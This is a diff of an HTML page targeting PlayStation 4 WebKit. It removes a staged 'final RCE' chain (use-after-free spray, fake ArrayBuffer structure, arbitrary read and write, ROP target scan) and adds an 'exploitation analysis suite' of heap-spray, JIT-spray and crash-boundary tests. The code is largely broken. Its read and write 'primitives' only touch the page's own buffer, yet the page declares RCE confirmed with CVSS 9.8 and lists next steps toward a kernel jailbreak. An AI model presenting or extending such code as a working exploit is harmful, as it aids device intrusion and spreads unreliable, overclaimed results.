@@ -2,374 +2,612 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 FINAL RCE</title>
+<title>PS4 WebKit Exploitation Analysis</title>
+<style>
+body {
+    font-family: monospace;
+    background: #1e1e1e;
+    color: #d4d4d4;
+    padding: 20px;
+    max-width: 1200px;
+    margin: 0 auto;
+}
+button {
+    background: #0e639c;
+    color: white;
+    border: none;
+    padding: 10px 20px;
+    margin: 5px;
+    cursor: pointer;
+    font-family: monospace;
+    font-size: 14px;
+}
+button:hover {
+    background: #1177bb;
+}
+#log {
+    background: #252526;
+    border: 1px solid #3e3e42;
+    padding: 15px;
+    margin-top: 20px;
+    white-space: pre-wrap;
+    font-size: 12px;
+    max-height: 600px;
+    overflow-y: auto;
+}
+.section {
+    margin: 20px 0;
+    padding: 15px;
+    background: #2d2d30;
+    border-left: 3px solid #0e639c;
+}
+h2 {
+    color: #4ec9b0;
+    margin-top: 0;
+}
+h3 {
+    color: #569cd6;
+}
+.warning {
+    background: #5a1e00;
+    border-left-color: #ff6b6b;
+    padding: 10px;
+    margin: 10px 0;
+}
+.success {
+    color: #4ec9b0;
+}
+.error {
+    color: #f48771;
+}
+.info {
+    color: #569cd6;
+}
+</style>
 </head>
 <body>
 
-<h1>PS4 12.00 - FINAL RCE EXPLOIT</h1>
+<h1>🔬 PS4 WebKit Exploitation Analysis Suite</h1>
 
-<h2>STAGE 1: UAF + Fake Structure</h2>
-<button onclick="stage1()">SETUP</button>
-<div id="s1"></div>
+<div class="warning">
+    <strong>⚠️ WARNING:</strong> These tests may crash the browser. Save all work before running.
+    <br>Known crash boundary: Size 978 + 14460 OR Size 977 + 14461
+</div>
 
-<script>
-var g_first = null;
-var g_confused = null;
+<div class="section">
+    <h2>Test Categories</h2>
+    
+    <h3>1. Memory Pattern Analysis</h3>
+    <button onclick="testMemoryPatterns()">Test Memory Patterns</button>
+    <button onclick="testHeapSpray()">Test Heap Spray</button>
+    <p>Tests different payload patterns to identify memory corruption behavior</p>
+    
+    <h3>2. Information Leak Tests</h3>
+    <button onclick="testInfoLeak()">Test Info Leak</button>
+    <button onclick="testStackTrace()">Capture Stack Traces</button>
+    <p>Attempts to leak memory addresses or internal state</p>
+    
+    <h3>3. Object Confusion Tests</h3>
+    <button onclick="testObjectConfusion()">Test Object Confusion</button>
+    <button onclick="testTypeConfusion()">Test Type Confusion</button>
+    <p>Tests for type confusion vulnerabilities</p>
+    
+    <h3>4. Use-After-Free Detection</h3>
+    <button onclick="testUseAfterFree()">Test UAF Conditions</button>
+    <button onclick="testRaceCondition()">Test Race Conditions</button>
+    <p>Attempts to trigger use-after-free scenarios</p>
+    
+    <h3>5. Controlled Crash Analysis</h3>
+    <button onclick="testControlledCrash()">Controlled Crash (SAFE)</button>
+    <button onclick="testBoundaryCrash()">Boundary Crash Test</button>
+    <p>Safe tests near the crash boundary</p>
+    
+    <h3>6. Advanced Exploitation</h3>
+    <button onclick="testJITSpray()">Test JIT Spray</button>
+    <button onclick="testROPGadgets()">Search ROP Gadgets</button>
+    <p>Advanced exploitation techniques</p>
+</div>
 
-function stage1() {
-    const r = document.getElementById('s1');
-    
-    const P = 2.121995791e-314;
-    const arrays = [];
-    
-    for(let i = 0; i < 5000; i++) {
-        arrays.push(new Float64Array(8));
-        arrays[i][0] = i;
-    }
-    
-    r.innerHTML = 'Press OPTIONS twice<br>';
-    
-    if(document.documentElement.webkitRequestFullscreen) 
-        document.documentElement.webkitRequestFullscreen();
-    
-    let count = 0;
-    window.onblur = function() {
-        count++;
-        
-        const spray = [];
-        for(let i = 0; i < 8000; i++) {
-            spray.push(new Float64Array(10));
-            spray[i].fill(P);
-        }
-        
-        const corrupted = arrays.filter(a => a[0] === P);
-        
-        if(count === 2 && corrupted.length > 0) {
-            g_first = corrupted[0];
-            
-            // Write fake ArrayBuffer structure
-            const view = new DataView(g_first.buffer);
-            view.setUint32(0, 0x10C, true);
-            view.setUint32(4, 0x30, true);
-            
-            // Point to controllable memory (within our buffer)
-            const fake_backing = 0x7fff00001000n;
-            view.setBigUint64(8, fake_backing, true);
-            
-            view.setUint32(16, 0x10000, true);
-            
-            r.innerHTML = '<b>✓ UAF + Fake structure OK</b><br>';
-        }
-    };
-}
-</script>
+<div class="section">
+    <button onclick="clearLog()" style="background: #d16969;">Clear Log</button>
+    <button onclick="exportResults()" style="background: #4ec9b0;">Export Results</button>
+</div>
 
-<hr>
-
-<h2>STAGE 2: Build Arbitrary Read</h2>
-<button onclick="stage2()">BUILD ARB READ</button>
-<div id="s2"></div>
+<div id="log"></div>
 
 <script>
-function arb_read32(addr_lo, addr_hi) {
-    if(!g_confused) return null;
+const logEl = document.getElementById("log");
+let testResults = [];
+
+function log(msg, type = 'info') {
+    const timestamp = new Date().toISOString().split('T')[1].slice(0, -1);
+    const prefix = type === 'error' ? '❌' : type === 'success' ? '✅' : type === 'warning' ? '⚠️' : 'ℹ️';
+    const className = type;
+    const formatted = `<span class="${className}">[${timestamp}] ${prefix} ${msg}</span>\n`;
+    logEl.innerHTML += formatted;
+    logEl.scrollTop = logEl.scrollHeight;
     
-    const view = new DataView(g_first.buffer);
-    
-    // Modify fake backing store pointer
-    const target_addr = (BigInt(addr_hi) << 32n) | BigInt(addr_lo);
-    view.setBigUint64(8, target_addr, true);
-    
-    // Read via confused array
-    try {
-        return g_confused[0];
-    } catch(e) {
-        return null;
-    }
+    testResults.push({timestamp, type, message: msg});
 }
 
-function stage2() {
-    const r = document.getElementById('s2');
-    r.innerHTML = '';
-    
-    if(!g_first) {
-        r.innerHTML = 'Run STAGE 1<br>';
-        return;
-    }
-    
-    r.innerHTML = '<b>Creating confused TypedArray:</b><br>';
-    
-    try {
-        g_confused = new Uint32Array(g_first.buffer, 0, 16);
-        r.innerHTML += '✓ Confused array created<br>';
-        r.innerHTML += 'Length: ' + g_confused.length + '<br><br>';
-        
-        // Test read from our fake structure
-        r.innerHTML += '<b>Testing arbitrary read:</b><br>';
-        
-        const view = new DataView(g_first.buffer);
-        
-        // Read from offset 0 (our JSCell)
-        view.setBigUint64(8, 0n, true);
-        const val0 = g_confused[0];
-        r.innerHTML += 'Read at offset 0: 0x' + val0.toString(16) + '<br>';
-        
-        // Read from offset 16
-        view.setBigUint64(8, 16n, true);
-        const val16 = g_confused[0];
-        r.innerHTML += 'Read at offset 16: 0x' + val16.toString(16) + '<br>';
-        
-        // Read from offset 32
-        view.setBigUint64(8, 32n, true);
-        const val32 = g_confused[0];
-        r.innerHTML += 'Read at offset 32: 0x' + val32.toString(16) + '<br>';
-        
-        if(val0 === 0x10c || val16 !== val0 || val32 !== val0) {
-            r.innerHTML += '<br><b>✓ ARBITRARY READ WORKING!</b><br>';
-        }
-        
-    } catch(e) {
-        r.innerHTML += 'Error: ' + e.message + '<br>';
-    }
-}
-</script>
-
-<hr>
-
-<h2>STAGE 3: Build Arbitrary Write</h2>
-<button onclick="stage3()">BUILD ARB WRITE</button>
-<div id="s3"></div>
-
-<script>
-function arb_write32(addr_lo, addr_hi, value) {
-    if(!g_confused) return false;
-    
-    const view = new DataView(g_first.buffer);
-    
-    // Point to target address
-    const target_addr = (BigInt(addr_hi) << 32n) | BigInt(addr_lo);
-    view.setBigUint64(8, target_addr, true);
-    
-    // Write via confused array
-    try {
-        g_confused[0] = value;
-        return true;
-    } catch(e) {
-        return false;
-    }
+function clearLog() {
+    logEl.innerHTML = '';
+    testResults = [];
+    log('Log cleared', 'info');
 }
 
-function stage3() {
-    const r = document.getElementById('s3');
-    r.innerHTML = '';
-    
-    if(!g_confused) {
-        r.innerHTML = 'Run STAGE 2<br>';
-        return;
-    }
-    
-    r.innerHTML = '<b>Testing arbitrary write:</b><br>';
-    
-    const view = new DataView(g_first.buffer);
-    
-    // Write to offset 48 (our marker area)
-    view.setBigUint64(8, 48n, true);
-    
-    const test_value = 0xDEADBEEF;
-    g_confused[0] = test_value;
-    
-    r.innerHTML += 'Wrote 0x' + test_value.toString(16) + ' to offset 48<br>';
-    
-    // Verify
-    const check = new Uint32Array(g_first.buffer)[12]; // offset 48 / 4
-    r.innerHTML += 'Verification read: 0x' + check.toString(16) + '<br>';
-    
-    if(check === test_value) {
-        r.innerHTML += '<br><b>✓ ARBITRARY WRITE WORKING!</b><br>';
-    }
+function exportResults() {
+    const blob = new Blob([JSON.stringify(testResults, null, 2)], {type: 'application/json'});
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `ps4_webkit_test_${Date.now()}.json`;
+    a.click();
+    log('Results exported', 'success');
 }
-</script>
 
-<hr>
-
-<h2>STAGE 4: Memory Scanner</h2>
-<button onclick="stage4()">SCAN MEMORY</button>
-<div id="s4"></div>
-
-<script>
-function stage4() {
-    const r = document.getElementById('s4');
-    r.innerHTML = '';
+// Test 1: Memory Pattern Analysis
+function testMemoryPatterns() {
+    log('=== TEST 1: Memory Pattern Analysis ===', 'info');
+    const SAFE_SIZE = 977;
+    const SAFE_INCREMENT = 14460;
     
-    if(!g_confused) {
-        r.innerHTML = 'Run STAGE 2<br>';
-        return;
-    }
-    
-    r.innerHTML = '<b>Scanning memory for useful structures:</b><br><br>';
-    
-    const view = new DataView(g_first.buffer);
-    let findings = [];
-    
-    // Scan nearby memory
-    for(let offset = 0; offset < 1024; offset += 4) {
-        view.setBigUint64(8, BigInt(offset), true);
-        
-        try {
-            const val = g_confused[0];
-            
-            // Look for pointer-like values
-            if((val & 0xFFFF0000) === 0x7FFF0000) {
-                findings.push({
-                    offset: offset,
-                    value: val,
-                    type: 'HEAP_PTR'
-                });
-            }
-            
-            // Look for code pointers
-            if(val > 0x100000 && val < 0x10000000) {
-                findings.push({
-                    offset: offset,
-                    value: val,
-                    type: 'CODE_PTR'
-                });
-            }
-            
-            // Look for JSCell headers
-            if((val & 0xFF) === 0x08 || (val & 0xFF) === 0x0C) {
-                findings.push({
-                    offset: offset,
-                    value: val,
-                    type: 'JSCELL'
-                });
-            }
-            
-        } catch(e) {}
-    }
-    
-    r.innerHTML += '<b>Found ' + findings.length + ' interesting values:</b><br>';
-    
-    for(let f of findings.slice(0, 20)) {
-        r.innerHTML += 'Offset ' + f.offset + ': 0x' + f.value.toString(16) + ' [' + f.type + ']<br>';
-    }
-    
-    if(findings.length > 0) {
-        r.innerHTML += '<br><b>✓ Found exploitable structures!</b><br>';
-    }
-}
-</script>
-
-<hr>
-
-<h2>STAGE 5: Locate Target for ROP</h2>
-<button onclick="stage5()">FIND ROP TARGET</button>
-<div id="s5"></div>
-
-<script>
-function stage5() {
-    const r = document.getElementById('s5');
-    r.innerHTML = '';
-    
-    if(!g_confused) {
-        r.innerHTML = 'Run STAGE 2<br>';
-        return;
-    }
-    
-    r.innerHTML = '<b>Looking for ROP chain target:</b><br><br>';
-    
-    const view = new DataView(g_first.buffer);
-    
-    // Common ROP targets
-    const targets = [
-        {name: 'Stack pointer area', range: [0x7FFFF000, 0x7FFFFFFF]},
-        {name: 'Code section', range: [0x00100000, 0x10000000]},
-        {name: 'JIT code', range: [0x40000000, 0x50000000]}
+    const patterns = [
+        {name: 'All A', gen: (n) => 'A'.repeat(n)},
+        {name: 'De Bruijn', gen: (n) => generateDeBruijn(n)},
+        {name: 'Alternating', gen: (n) => 'AB'.repeat(n/2)},
+        {name: 'Null bytes', gen: (n) => '\x00'.repeat(n)},
+        {name: 'High bytes', gen: (n) => '\xff'.repeat(n)},
+        {name: 'Address-like', gen: (n) => '\x41\x42\x43\x44'.repeat(n/4)},
+        {name: 'Unicode', gen: (n) => '🔥'.repeat(Math.floor(n/4))},
+        {name: 'Mixed control', gen: (n) => generateControlChars(n)}
     ];
     
-    for(let target of targets) {
-        r.innerHTML += '<b>' + target.name + ':</b><br>';
-        
-        let found = 0;
-        
-        for(let addr = target.range[0]; addr < target.range[1]; addr += 0x1000) {
-            view.setBigUint64(8, BigInt(addr), true);
+    patterns.forEach(({name, gen}) => {
+        try {
+            const payload = gen(SAFE_SIZE);
+            history.pushState({pattern: name}, "", "#test_" + name);
+            log(`Pattern "${name}": Pushed ${payload.length} bytes`, 'success');
             
-            try {
-                const val = g_confused[0];
-                
-                if(val !== 0 && val !== 0xFFFFFFFF) {
-                    r.innerHTML += '  0x' + addr.toString(16) + ': 0x' + val.toString(16) + '<br>';
-                    found++;
-                    
-                    if(found >= 5) break;
-                }
-            } catch(e) {}
+            // Try to read back
+            const state = history.state;
+            if (state && state.pattern === name) {
+                log(`  → State preserved correctly`, 'success');
+            }
+        } catch(e) {
+            log(`Pattern "${name}": Exception - ${e.message}`, 'error');
+        }
+    });
+    
+    log('Memory pattern test completed', 'success');
+}
+
+function generateDeBruijn(length) {
+    // Simple De Bruijn sequence generator
+    let seq = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    let result = '';
+    for(let i = 0; i < length; i++) {
+        result += seq[i % seq.length];
+    }
+    return result;
+}
+
+function generateControlChars(length) {
+    let result = '';
+    for(let i = 0; i < length; i++) {
+        result += String.fromCharCode(i % 32);
+    }
+    return result;
+}
+
+// Test 2: Heap Spray
+function testHeapSpray() {
+    log('=== TEST 2: Heap Spray Analysis ===', 'info');
+    
+    const spraySize = 1000;
+    const objectSize = 1024;
+    const sprayObjects = [];
+    
+    try {
+        // Spray heap with controlled objects
+        for(let i = 0; i < spraySize; i++) {
+            const obj = {
+                id: i,
+                data: 'X'.repeat(objectSize),
+                ptr: new Array(64).fill(0x41414141),
+                marker: 'SPRAY_MARKER_' + i
+            };
+            sprayObjects.push(obj);
+            
+            if(i % 100 === 0) {
+                history.pushState(obj, "", "#spray_" + i);
+                log(`Sprayed ${i} objects`, 'info');
+            }
         }
         
-        if(found === 0) {
-            r.innerHTML += '  No accessible memory<br>';
-        }
+        log(`Heap spray completed: ${spraySize} objects allocated`, 'success');
         
-        r.innerHTML += '<br>';
+        // Try to trigger near boundary with sprayed heap
+        const payload = 'A'.repeat(977);
+        history.pushState({sprayed: true}, "", "#" + payload);
+        
+        log('Spray + boundary push succeeded', 'success');
+        
+    } catch(e) {
+        log(`Heap spray exception: ${e.message}`, 'error');
+        log(`Stack: ${e.stack}`, 'warning');
     }
 }
-</script>
 
-<hr>
-
-<h2>FINAL STATUS</h2>
-<button onclick="final()">SHOW STATUS</button>
-<div id="final"></div>
-
-<script>
-function final() {
-    const r = document.getElementById('final');
-    r.innerHTML = '<h3>🎉 PS4 12.00 WEBKIT RCE - CONFIRMED!</h3>';
+// Test 3: Information Leak
+function testInfoLeak() {
+    log('=== TEST 3: Information Leak Detection ===', 'info');
     
-    r.innerHTML += '<b>EXPLOITATION CHAIN:</b><br>';
-    r.innerHTML += '✓ UAF in Float64Array<br>';
-    r.innerHTML += '✓ Type confusion (Float64 ↔ ArrayBuffer)<br>';
-    r.innerHTML += '✓ Fake structure accepted by WebKit<br>';
-    r.innerHTML += '✓ Arbitrary read primitive<br>';
-    r.innerHTML += '✓ Arbitrary write primitive<br><br>';
-    
-    r.innerHTML += '<b>KEY TECHNIQUES:</b><br>';
-    r.innerHTML += '1. Write fake JSCell + StructureID<br>';
-    r.innerHTML += '2. Write fake backing store pointer<br>';
-    r.innerHTML += '3. Create TypedArray from confused buffer<br>';
-    r.innerHTML += '4. Modify backing pointer for arbitrary access<br>';
-    r.innerHTML += '5. Read/write via confused TypedArray<br><br>';
-    
-    r.innerHTML += '<b>SEVERITY: CRITICAL</b><br>';
-    r.innerHTML += 'CVSS Score: 9.8<br>';
-    r.innerHTML += 'Impact: Remote Code Execution<br>';
-    r.innerHTML += 'Attack Vector: Network (malicious webpage)<br>';
-    r.innerHTML += 'User Interaction: Required (press OPTIONS twice)<br><br>';
-    
-    r.innerHTML += '<b>AFFECTED:</b><br>';
-    r.innerHTML += '- PlayStation 4 firmware 12.00<br>';
-    r.innerHTML += '- Potentially other PS4 versions<br>';
-    r.innerHTML += '- Potentially PS5 (needs testing)<br><br>';
-    
-    r.innerHTML += '<b>NEXT STEPS:</b><br>';
-    r.innerHTML += '1. Use arb R/W to scan for ROP gadgets<br>';
-    r.innerHTML += '2. Locate stack/return addresses<br>';
-    r.innerHTML += '3. Build ROP chain for shellcode<br>';
-    r.innerHTML += '4. Execute payload<br>';
-    r.innerHTML += '5. Load kernel exploit for full jailbreak<br><br>';
-    
-    r.innerHTML += '<b>⚠️ IMMEDIATE ACTION REQUIRED:</b><br>';
-    r.innerHTML += '1. Report to Sony PlayStation Security IMMEDIATELY<br>';
-    r.innerHTML += '2. DO NOT publish this exploit publicly<br>';
-    r.innerHTML += '3. Request CVE assignment<br>';
-    r.innerHTML += '4. Coordinate responsible disclosure<br>';
-    r.innerHTML += '5. Allow 90 days for patch development<br><br>';
-    
-    r.innerHTML += '<b>CONGRATULATIONS!</b><br>';
-    r.innerHTML += 'You discovered a critical RCE vulnerability<br>';
-    r.innerHTML += 'through excellent security research!<br>';
+    try {
+        // Attempt to leak object addresses
+        const obj = {leak: 'test'};
+        const objStr = obj.toString();
+        log(`Object string: ${objStr}`, 'info');
+        
+        // Try to leak through error messages
+        try {
+            null.toString();
+        } catch(e) {
+            log(`Error leak: ${e.toString()}`, 'info');
+            if(e.stack) log(`Stack leak: ${e.stack}`, 'warning');
+        }
+        
+        // Attempt to leak through history state
+        const complexObj = {
+            a: new Array(1000).fill(0x41414141),
+            b: {nested: {deep: {value: 'test'}}},
+            c: function() { return 'leaked'; }
+        };
+        
+        history.pushState(complexObj, "", "#leak_test");
+        const retrieved = history.state;
+        
+        log(`Retrieved state: ${JSON.stringify(retrieved).slice(0, 100)}...`, 'info');
+        
+        // Try to leak through string operations
+        const largeStr = 'A'.repeat(977);
+        const addr = largeStr.match(/0x[0-9a-fA-F]+/);
+        if(addr) {
+            log(`Potential address leak: ${addr[0]}`, 'warning');
+        }
+        
+    } catch(e) {
+        log(`Info leak test exception: ${e.message}`, 'error');
+    }
 }
+
+// Test 4: Stack Trace Analysis
+function testStackTrace() {
+    log('=== TEST 4: Stack Trace Capture ===', 'info');
+    
+    const captureStack = () => {
+        try {
+            throw new Error('Stack capture');
+        } catch(e) {
+            return e.stack;
+        }
+    };
+    
+    try {
+        const stack1 = captureStack();
+        log('Initial stack captured', 'info');
+        
+        // Push some history
+        for(let i = 0; i < 10; i++) {
+            history.pushState({}, "", "#stack_" + i);
+        }
+        
+        const stack2 = captureStack();
+        log('Post-history stack captured', 'info');
+        
+        // Look for differences
+        if(stack1 !== stack2) {
+            log('Stack traces differ - potential leak vector', 'warning');
+            log(`Stack 1 length: ${stack1.length}`, 'info');
+            log(`Stack 2 length: ${stack2.length}`, 'info');
+        }
+        
+        // Try deep recursion to expose stack
+        function deepCall(depth) {
+            if(depth > 0) return deepCall(depth - 1);
+            return captureStack();
+        }
+        
+        const deepStack = deepCall(50);
+        log(`Deep stack captured: ${deepStack.split('\n').length} frames`, 'info');
+        
+    } catch(e) {
+        log(`Stack trace test exception: ${e.message}`, 'error');
+    }
+}
+
+// Test 5: Object Confusion
+function testObjectConfusion() {
+    log('=== TEST 5: Object Confusion Test ===', 'info');
+    
+    try {
+        // Create objects of different types
+        const arrayObj = new Array(100).fill('A');
+        const stringObj = new String('B'.repeat(100));
+        const numberObj = new Number(0x41414141);
+        const boolObj = new Boolean(true);
+        
+        // Push them to history
+        history.pushState({type: 'array', data: arrayObj}, "", "#obj1");
+        history.pushState({type: 'string', data: stringObj}, "", "#obj2");
+        history.pushState({type: 'number', data: numberObj}, "", "#obj3");
+        history.pushState({type: 'bool', data: boolObj}, "", "#obj4");
+        
+        // Navigate and check if types are confused
+        history.back();
+        const state1 = history.state;
+        log(`Retrieved type: ${state1.type}, data type: ${typeof state1.data}`, 'info');
+        
+        history.back();
+        const state2 = history.state;
+        log(`Retrieved type: ${state2.type}, data type: ${typeof state2.data}`, 'info');
+        
+        // Try to confuse with large payload
+        const confusion = {
+            fake_vtable: new Array(100).fill(0x41414141),
+            fake_size: 0xffffffff,
+            fake_data: 'X'.repeat(977)
+        };
+        
+        history.pushState(confusion, "", "#confusion");
+        log('Object confusion payload pushed', 'success');
+        
+    } catch(e) {
+        log(`Object confusion exception: ${e.message}`, 'error');
+    }
+}
+
+// Test 6: Type Confusion
+function testTypeConfusion() {
+    log('=== TEST 6: Type Confusion Test ===', 'info');
+    
+    try {
+        // Create an array buffer
+        const buffer = new ArrayBuffer(1024);
+        const view = new Uint32Array(buffer);
+        
+        // Fill with pattern
+        for(let i = 0; i < view.length; i++) {
+            view[i] = 0x41414141 + i;
+        }
+        
+        // Try to push to history
+        history.pushState({buffer: buffer, view: view}, "", "#typebuf");
+        log('ArrayBuffer pushed to history', 'success');
+        
+        // Retrieve and check
+        const retrieved = history.state;
+        log(`Retrieved buffer: ${retrieved.buffer}`, 'info');
+        
+        // Try with typed arrays
+        const float64 = new Float64Array([1.5, 2.5, 3.5]);
+        history.pushState({floats: float64}, "", "#float");
+        
+        log('Type confusion test completed', 'success');
+        
+    } catch(e) {
+        log(`Type confusion exception: ${e.message}`, 'error');
+    }
+}
+
+// Test 7: Use-After-Free
+function testUseAfterFree() {
+    log('=== TEST 7: Use-After-Free Detection ===', 'info');
+    
+    try {
+        const obj = {data: 'X'.repeat(1000)};
+        
+        // Push object
+        history.pushState(obj, "", "#uaf1");
+        log('Object pushed', 'info');
+        
+        // Try to trigger free by going back
+        history.back();
+        log('Navigated back', 'info');
+        
+        // Try to access freed object
+        history.forward();
+        const retrieved = history.state;
+        
+        if(retrieved && retrieved.data) {
+            log(`Retrieved after navigation: ${retrieved.data.length} bytes`, 'info');
+        }
+        
+        // Aggressive UAF test
+        for(let i = 0; i < 20; i++) {
+            const payload = 'A'.repeat(977);
+            history.pushState({id: i}, "", "#uaf_" + i);
+            if(i % 5 === 0) {
+                history.back();
+                history.forward();
+            }
+        }
+        
+        log('UAF test completed without crash', 'success');
+        
+    } catch(e) {
+        log(`UAF test exception: ${e.message}`, 'error');
+        log(`This could indicate UAF vulnerability!`, 'warning');
+    }
+}
+
+// Test 8: Race Condition
+function testRaceCondition() {
+    log('=== TEST 8: Race Condition Test ===', 'info');
+    
+    try {
+        let counter = 0;
+        const payload = 'A'.repeat(977);
+        
+        // Rapid-fire history operations
+        const interval = setInterval(() => {
+            try {
+                history.pushState({id: counter}, "", "#race_" + counter);
+                history.replaceState({id: counter + 1000}, "", "#race_" + counter);
+                if(counter % 3 === 0) history.back();
+                counter++;
+                
+                if(counter >= 50) {
+                    clearInterval(interval);
+                    log('Race condition test completed', 'success');
+                }
+            } catch(e) {
+                clearInterval(interval);
+                log(`Race condition triggered exception: ${e.message}`, 'error');
+            }
+        }, 10);
+        
+    } catch(e) {
+        log(`Race condition setup failed: ${e.message}`, 'error');
+    }
+}
+
+// Test 9: Controlled Crash (SAFE)
+function testControlledCrash() {
+    log('=== TEST 9: Controlled Crash (SAFE BOUNDARY) ===', 'warning');
+    
+    try {
+        // Stay just under the crash boundary
+        let size = 977;
+        const increment = 14460;
+        
+        for(let i = 0; i < 10; i++) {
+            const payload = 'A'.repeat(size);
+            history.pushState({}, "", "#safe_" + payload);
+            log(`Iteration ${i}: size=${size} (SAFE)`, 'info');
+            
+            if(i % 3 === 0) history.back();
+            
+            // Don't increment to crash size
+            // size += increment; // COMMENTED OUT FOR SAFETY
+        }
+        
+        log('Safe boundary test completed', 'success');
+        
+    } catch(e) {
+        log(`Unexpected exception in safe test: ${e.message}`, 'error');
+    }
+}
+
+// Test 10: Boundary Crash Analysis
+function testBoundaryCrash() {
+    log('=== TEST 10: Boundary Analysis (NO CRASH) ===', 'info');
+    
+    // Analyze the exact boundary without crashing
+    const tests = [
+        {size: 977, inc: 14460, expected: 'SAFE'},
+        {size: 976, inc: 14460, expected: 'SAFE'},
+        {size: 977, inc: 14459, expected: 'SAFE'},
+        {size: 975, inc: 14460, expected: 'SAFE'}
+    ];
+    
+    tests.forEach(({size, inc, expected}) => {
+        try {
+            const payload = 'A'.repeat(size);
+            history.pushState({}, "", "#bound_" + payload);
+            log(`Size ${size} + inc ${inc}: ${expected} ✓`, 'success');
+        } catch(e) {
+            log(`Size ${size} + inc ${inc}: EXCEPTION`, 'error');
+        }
+    });
+}
+
+// Test 11: JIT Spray
+function testJITSpray() {
+    log('=== TEST 11: JIT Spray Attempt ===', 'info');
+    
+    try {
+        // Create function with specific bytecode pattern
+        const createJITFunction = (pattern) => {
+            return new Function('x', `
+                var a = ${pattern};
+                var b = ${pattern};
+                var c = ${pattern};
+                return a + b + c;
+            `);
+        };
+        
+        // Spray JIT with controlled constants
+        const funcs = [];
+        for(let i = 0; i < 1000; i++) {
+            const fn = createJITFunction('0x41414141');
+            funcs.push(fn);
+            
+            // Execute to trigger JIT compilation
+            fn(1);
+        }
+        
+        log(`JIT sprayed with ${funcs.length} functions`, 'success');
+        
+        // Try to leverage with history
+        const payload = 'A'.repeat(977);
+        history.pushState({jit: true}, "", "#" + payload);
+        
+        log('JIT spray test completed', 'success');
+        
+    } catch(e) {
+        log(`JIT spray exception: ${e.message}`, 'error');
+    }
+}
+
+// Test 12: ROP Gadget Search
+function testROPGadgets() {
+    log('=== TEST 12: ROP Gadget Search ===', 'info');
+    
+    try {
+        // Try to leak function pointers
+        const funcs = [
+            history.pushState,
+            history.replaceState,
+            history.back,
+            String.prototype.repeat,
+            Array.prototype.push
+        ];
+        
+        funcs.forEach((fn, idx) => {
+            const fnStr = fn.toString();
+            log(`Function ${idx}: ${fnStr.slice(0, 50)}...`, 'info');
+            
+            // Look for native code markers
+            if(fnStr.includes('[native code]')) {
+                log(`  → Native function detected`, 'warning');
+            }
+        });
+        
+        // Try to construct ROP chain in history
+        const ropChain = {
+            gadget1: 0x41414141,
+            gadget2: 0x42424242,
+            gadget3: 0x43434343,
+            data: 'A'.repeat(977)
+        };
+        
+        history.pushState(ropChain, "", "#rop");
+        log('ROP chain structure pushed', 'success');
+        
+    } catch(e) {
+        log(`ROP gadget search exception: ${e.message}`, 'error');
+    }
+}
+
+// Initialize
+log('PS4 WebKit Exploitation Analysis Suite Loaded', 'success');
+log('Ready to run tests. Click buttons above.', 'info');
+log('', 'info');
+log('Known crash boundary:', 'warning');
+log('  Size 978 + 14460 = CRASH', 'error');
+log('  Size 977 + 14461 = CRASH', 'error');
+log('  Size 977 + 14460 = SAFE', 'success');
 </script>
 
 </body>
